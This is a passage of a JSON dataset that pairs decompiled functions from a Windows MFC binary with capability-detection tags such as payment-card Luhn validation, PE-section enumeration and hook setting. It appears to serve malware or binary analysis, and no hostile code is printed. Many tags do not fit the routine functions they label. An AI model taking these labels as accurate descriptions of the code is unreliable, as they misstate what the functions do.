        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00433ee3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(extraout_ECX + 200) = 0x441628;\n    puVar5 = 0x44160c;\n    do {\n        if ((*(unaff_EBP + 8) & *puVar5 & 0xf000) != 0) {\n            iVar3 = fcn.004329b1(puVar5[-1]);\n            if (iVar3 == 0) {\n                iVar3 = fcn.0041bab6(0xbc);\n                *(unaff_EBP + -0x10) = iVar3;\n                *(unaff_EBP + -4) = 0;\n                if (iVar3 == 0) {\n                    piVar4 = NULL;\n                }\n                else {\n                    piVar4 = fcn.0042cc84(0);\n                }\n                uVar1 = puVar5[-1];\n                uVar2 = *puVar5;\n                iVar3 = *piVar4;\n                *(unaff_EBP + -4) = 0xffffffff;\n                iVar3 = (**(iVar3 + 0x164))(extraout_ECX, uVar2 | 0x56000000, uVar1);\n                if (iVar3 == 0) {\n                    fcn.00425f1e();\n                }\n            }\n        }\n        puVar5 = puVar5 + 2;\n    } while (puVar5 < 0x44162c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 484
    },
    "00434181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00434181(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00434fe8();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 57
    },
    "0043457b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043457b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t Y, uint crColor)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_SetBkColor)(*(in_ECX + 4), crColor);\n    var_10h = arg_8h;\n    var_8h = arg_8h + arg_10h;\n    var_ch = arg_ch;\n    var_4h = arg_ch + Y;\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(in_ECX + 4), 0, 0, 2, &var_10h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 207
    },
    "004345c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004345c7(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.0043457b(arg_8h, arg_ch, arg_10h + -1, 1, arg_18h);\n    fcn.0043457b(arg_8h, arg_ch, 1, arg_14h + -1, arg_18h);\n    fcn.0043457b(arg_8h + arg_10h, arg_ch, 0xffffffff, arg_14h, arg_1ch);\n    fcn.0043457b(arg_8h, arg_ch + arg_14h, arg_10h, 0xffffffff, arg_1ch);\n    return;\n}\n",
        "token_count": 200
    },
    "00434b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00434b28(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    if (arg_10h < 0) {\n        arg_10h = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (iVar2 < arg_ch + arg_10h) {\n        arg_10h = iVar2 - arg_ch;\n    }\n    if (iVar2 < arg_ch) {\n        arg_10h = 0;\n    }\n    if ((arg_ch == 0) && (arg_10h == iVar2)) {\n        fcn.004026b0();\n    }\n    else {\n        uVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n        fcn.00434b0e(iVar1 + arg_ch, arg_10h, uVar3);\n    }\n    return arg_8h;\n}\n",
        "token_count": 274
    },
    "0043500e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043500e(void)\n\n{\n    fcn.00434fe8();\n    fcn.00437973(0x434fa8);\n    return;\n}\n",
        "token_count": 39
    },
    "00435e8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435e8a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    iVar1 = fcn.00434fd8();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x24) = 1;\n    return;\n}\n",
        "token_count": 201
    },
    "00436e16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00436e16(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0x70)) {\n        do {\n            fcn.00402350();\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0x70));\n    }\n    iVar2 = fcn.0043724a(param_2, param_3);\n    if (iVar2 != 0) {\n        iVar2 = 0;\n        if (0 < *(param_1 + 0x70)) {\n            iVar1 = *(param_1 + 0x74) + 0x10;\n            do {\n                if (iVar1 != 0) {\n                    fcn.00402330();\n                }\n                iVar1 = iVar1 + 0x14;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < *(param_1 + 0x70));\n        }\n        iVar2 = 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 261
    },
    "00437003": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00437003(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *lpString;\n    uint unaff_EDI;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    int32_t *noname_4;\n    int32_t var_38h;\n    uint noname_3;\n    uint noname_4_00;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_16;\n    \n    noname_16 = 0x43700d;\n    fcn.0040bb7c();\n    noname_4_00 = 0x14;\n    noname_3 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    iVar1 = fcn.00436e16();\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x18) = 1;\n        var_38h = unaff_EBX;\n        if (*(unaff_EBP + 8) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0x31, 0, 0);\n            var_38h = 0x437054;\n            fcn.00426309(0x437054);\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + -0x14) = 0;\n            if (iVar1 != 0) {\n                uVar2 = fcn.004097a6();\n                *(unaff_EBP + -0x14) = uVar2;\n                var_38h = iVar1;\n            }\n            piVar5 = *(extraout_ECX + 0x74);\n            *(unaff_EBP + -0x10) = 0;\n            if (0 < *(unaff_EBP + 0xc)) {\n                lpString = piVar5 + 4;\n                do {\n                    iVar1 = **(unaff_EBP + 8);\n                    *(unaff_EBP + 8) = *(unaff_EBP + 8) + 4;\n                    lpString[-1] = lpString[-1] | 1;\n                    *piVar5 = iVar1;\n                    if (iVar1 != 0) {\n                        iVar3 = fcn.004033b0();\n                        if (iVar3 != 0) {\n                            iVar3 = unaff_EBP + -0x24;\n                            noname_4 = lpString;\n                            piVar4 = fcn.004097be(iVar3, lpString);\n                            lpString[-3] = *piVar4;\n                            var_38h = *(unaff_EBP + -0x10);\n                            iVar1 = fcn.00428f14(var_38h, *lpString, 0, iVar3, noname_4, iVar1);\n                            if (iVar1 != 0) goto code_r0x00437119;\n                        }\n                        *(unaff_EBP + -0x18) = 0;\n                        break;\n                    }\n                    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n                    iVar1 = *(unaff_EBP + -0x10);\n                    lpString[-3] = iVar3 / 4;\n                    if (iVar1 == 0) {\n                        lpString[-2] = lpString[-2] | 0x8000100;\n                    }\ncode_r0x00437119:\n                    piVar5 = piVar5 + 5;\n                    lpString = lpString + 5;\n                    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 1;\n                } while (*(unaff_EBP + -0x10) < *(unaff_EBP + 0xc));\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                var_38h = *(unaff_EBP + -0x14);\n                fcn.004097a6();\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00426364();\n        }\n        fcn.00436ecc(1, 1, var_38h, noname_3, noname_4_00, unaff_EDI, in_stack_ffffffd4, var_24h, in_stack_ffffffdc, \n                     var_1ch, var_18h, var_14h, var_10h, var_ch, in_stack_fffffff4, var_4h, noname_16, unaff_retaddr, \n                     arg_8h, arg_ch, in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018);\n        iVar1 = *(unaff_EBP + -0x18);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 1387
    },
    "00437762": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437762(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint lpCriticalSection;\n    \n    puVar1 = in_ECX + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((arg_8h < 1) || (in_ECX[3] <= arg_8h)) goto code_r0x0043785c;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (iVar2 == 0) {\n        iVar2 = fcn.0043744e(0x10);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.004376b4();\n        }\n        *(iVar2 + 8) = 0;\n        *(iVar2 + 0xc) = 0;\n        *(iVar2 + in_ECX[6]) = in_ECX[5];\n        in_ECX[5] = iVar2;\ncode_r0x004377dd:\n        if (*(iVar2 + 0xc) == 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(*(iVar2 + 0xc), in_ECX[3] << 2, 2);\n        }\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n            iVar3 = fcn.004198b2();\n        }\n        *(iVar2 + 0xc) = iVar3;\n        fcn.0040bbe0(iVar3 + *(iVar2 + 8) * 4, 0, (in_ECX[3] - *(iVar2 + 8)) * 4);\n        *(iVar2 + 8) = in_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, iVar2);\n    }\n    else if ((*(iVar2 + 8) <= arg_8h) && (arg_ch != 0)) goto code_r0x004377dd;\n    if ((*(iVar2 + 0xc) != 0) && (arg_8h < *(iVar2 + 8))) {\n        *(*(iVar2 + 0xc) + arg_8h * 4) = arg_ch;\n    }\ncode_r0x0043785c:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return;\n}\n",
        "token_count": 607
    },
    "00437f17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00437f17(int32_t *param_1, uint8_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    if (((-1 < param_3) && (param_3 < *(*param_1 + -0xc))) &&\n       (iVar1 = fcn.0040c38a(*param_1 + param_3, param_2),  iVar1 != 0)) {\n        return iVar1 - *param_1;\n    }\n    return -1;\n}\n",
        "token_count": 123
    },
    "00437f7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437f7d(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (arg_ch < iVar2) {\n        uVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n        fcn.00434b0e((iVar1 - arg_ch) + iVar2, arg_ch, uVar3);\n    }\n    else {\n        fcn.004026b0();\n    }\n    return arg_8h;\n}\n",
        "token_count": 186
    },
    "00438d26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00438d26(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004375e2(0x438bbb);\n    while ((*(iVar1 + 4) == 0 &&\n           (iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(&stack0xffffffe0, 0, 0, 0, 0),  iVar2 != 0))) {\n        iVar2 = fcn.0041d4de();\n        if (iVar2 == 0) {\n            return false;\n        }\n    }\n    return *(iVar1 + 4) == 0;\n}\n",
        "token_count": 148
    },
    "0043a9f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0043a9f4(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    char *arg_8h;\n    \n    iVar2 = fcn.00434fe8();\n    fcn.00437b0b(1);\n    arg_8h = iVar2 + 0x34;\n    while (*arg_8h != '\\0') {\n        puVar3 = fcn.0040c38a(arg_8h, 10);\n        *puVar3 = 0;\n        iVar4 = fcn.00434fe8();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(arg_8h, *(iVar4 + 8));\n        arg_8h = puVar3 + 1;\n    }\n    *(iVar2 + 0x34) = '\\0';\n    fcn.00437b6e(1);\n    iVar2 = fcn.00434fe8();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x38),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.0043500e();\n    if (*(iVar2 + 0x3c) != NULL) {\n        iVar4 = (**(**(iVar2 + 0x3c) + 0x138))();\n        if (iVar4 != 0) {\n            *(iVar2 + 0x3c) = 0;\n        }\n    }\n    iVar2 = fcn.00434fd8();\n    iVar4 = fcn.00434fe8();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar4 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "004015d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015d0(int32_t param_1)\n\n{\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    *(param_1 + 0xc) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 242
    },
    "00418af2": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00418af2(uint arg_8h)\n\n{\n    uchar uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = 0x1;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    extraout_ECX[4] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(extraout_ECX + 5) = uVar1;\n    fcn.00404010(0x445400);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 258
    },
    "00419839": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419839(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.0041bbb0(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0041ac24": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041ac24(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CStringList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 105
    },
    "0041aca9": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aca9(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 4); puVar1 != NULL; puVar1 = *puVar1) {\n        fcn.00402350();\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.0041b09b();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 152
    },
    "0041ae67": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ae67(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.0041b09b();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "0041af2c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041af2c(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 106
    },
    "0041b4fa": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b4fa(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.0041bae1(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.0041b09b();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "0041b691": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b691(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "0041b7a7": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b7a7(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 134
    },
    "0041b82e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041b82e(int32_t param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    uVar2 = fcn.0041b786(param_2);\n    *param_3 = uVar2;\n    uVar2 = uVar2 % *(param_1 + 8);\n    *param_2 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar3 = *(*(param_1 + 4) + uVar2 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n            if ((puVar3[1] == *param_3) && (cVar1 = fcn.004351f0(puVar3 + 2, unaff_retaddr),  cVar1 != '\\0')) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 242
    },
    "0041b923": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b923(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_1[1] != NULL) {\n        pcVar1 = NULL;\n        if (param_1[2] != NULL) {\n            do {\n                for (puVar2 = *(param_1[1] + pcVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    fcn.00402350();\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (pcVar1 < param_1[2]);\n        }\n        fcn.0041bae1(param_1[1]);\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    fcn.0041b09b();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 232
    },
    "0041bd46": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bd46(int32_t param_1)\n\n{\n    *(param_1 + 4) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "0041bffb": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bffb(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 126
    },
    "00426443": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00426443(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint hWnd;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x1c);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.00426288(uVar2);\n    if (iVar3 == 0) {\n        fcn.00425f1e();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 340
    },
    "00435aa9": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00435aa9(code **param_1)\n\n{\n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.00402330();\n    fcn.00402330();\n    fcn.00402330();\n    fcn.00402330();\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[1] = 0x1;\n    return param_1;\n}\n",
        "token_count": 115
    },
    "0043656d": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0043656d(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00434181();\n    return param_1;\n}\n",
        "token_count": 144
    },
    "00438bec": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t * fcn.00438bec(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00402330();\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0041bab6(0xb8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 1;\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00419b0f(0, 0x40004, 0);\n    }\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = iVar2;\n    *(*(iVar2 + 0x70) + 0x1c) = 1;\n    *(*(*extraout_ECX + 0x70) + 0x1e) = 0xffff;\n    extraout_ECX[0xd] = -1;\n    extraout_ECX[8] = 0;\n    extraout_ECX[2] = 0;\n    extraout_ECX[3] = 0;\n    extraout_ECX[1] = 0;\n  